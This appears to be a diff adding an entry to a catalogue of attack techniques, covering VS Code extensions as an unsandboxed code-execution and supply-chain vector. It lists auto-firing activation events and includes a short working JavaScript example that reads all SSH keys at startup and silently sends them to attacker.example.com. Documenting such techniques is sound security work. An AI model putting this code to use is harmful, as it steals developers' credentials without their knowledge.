@@ -1,0 +1,69 @@
+name: VS Code Extension
+id: vscode-extension
+description: >
+  VS Code extensions run in a Node.js environment without sandboxing. Although the
+  VS Code API is scoped to the current workspace, full Node.js APIs are available,
+  allowing a malicious extension to read arbitrary files, execute shell commands,
+  make network requests, and more. Marketplace vetting relies mainly on static
+  analysis and is straightforward to bypass.
+tags:
+  - vscode
+  - ide
+  - code-execution
+  - supply-chain
+
+exploitation: |
+  VS Code extensions have access to the full Node.js runtime. An extension can:
+
+  - Read or exfiltrate any file on the filesystem (e.g., SSH keys, `.env` files, credential stores)
+  - Execute arbitrary shell commands via `child_process.exec` / `spawnSync`
+  - Make outbound network requests to attacker-controlled servers
+  - Hook into VS Code events (file save, terminal open, workspace load) to trigger payloads silently
+
+  ### Trigger points
+
+  Extensions are activated based on `activationEvents` in `package.json`. Common events that
+  fire automatically without any user interaction beyond opening VS Code:
+
+  - `onStartupFinished` - runs shortly after VS Code starts
+  - `*` - runs on every startup (older style, still works)
+  - `workspaceContains:<glob>` - runs when a matching file is found in the workspace
+  - `onLanguage:<id>` - runs when a file of the given language is opened
+
+  ### Example: silent data exfiltration on startup
+
+  `package.json` activation:
+  ```json
+  {
+    "activationEvents": ["onStartupFinished"]
+  }
+  ```
+
+  `extension.js`:
+  ```js
+  const https = require('https');
+  const fs = require('fs');
+  const os = require('os');
+
+  exports.activate = function () {
+    try {
+      const sshKeys = fs.readdirSync(`${os.homedir()}/.ssh`)
+        .map(f => fs.readFileSync(`${os.homedir()}/.ssh/${f}`, 'utf8'));
+      const payload = Buffer.from(JSON.stringify({ host: os.hostname(), keys: sshKeys })).toString('base64');
+      https.get(`https://attacker.example.com/collect?d=${payload}`);
+    } catch (_) {}
+  };
+  ```
+
+  ### Persistence via workspace trust bypass
+
+  Extensions that are installed in the user profile (default install method) run regardless of workspace trust level.
+  Even in [Restricted Mode](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust), user-installed extensions remain active.
+
+references:
+  - url: https://code.visualstudio.com/api/references/activation-events
+    description: VS Code Extension Activation Events
+  - url: https://code.visualstudio.com/docs/editor/extension-marketplace
+    description: VS Code Extension Marketplace
+  - url: https://code.visualstudio.com/docs/editor/workspace-trust
+    description: VS Code Workspace Trust
